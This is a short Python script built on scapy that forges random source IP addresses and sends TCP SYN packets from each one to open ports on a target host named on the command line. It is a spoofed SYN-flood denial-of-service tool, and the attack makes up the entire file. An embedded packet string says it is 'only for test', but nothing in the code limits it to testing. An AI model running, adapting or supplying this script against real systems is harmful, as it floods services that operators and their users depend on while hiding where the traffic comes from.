from scapy.all import *
import random
import os
import sys

loop = int(sys.argv[1])
loop_add = 0
IPs=[]
open_port=[]
loop2 = 0

while loop_add < loop :
    Ip_srcA = random.randrange(0,255)
    Ip_srcB = random.randrange(0,255)
    Ip_srcC = random.randrange(0,255)
    Ip_scrD = random.randrange(0,255)
    source = str(Ip_srcA)+"."+str(Ip_srcB)+"."+str(Ip_srcC)+"."+str(Ip_scrD)
    loop_add = loop_add+1
    IPs.append(source)


file1 = open("/tmp/OPEN_PORT")

for port in file1:
    open_port.append(int(port))

target = str(sys.argv[2])

number_packet = 0
   
for ip in IPs:
    Port_src = random.randrange(1,65534)
    sequence = random.randrange(1,300000)
    send(IP(src=ip,dst=target)/TCP(sport=Port_src,dport=open_port,flags="S",seq=sequence)/"Hello World this Tools is Only for Test your Service on Internet dont use for Dangerous Purpose")
    number_packet += 1 
    print("send packet number",number_packet)
   
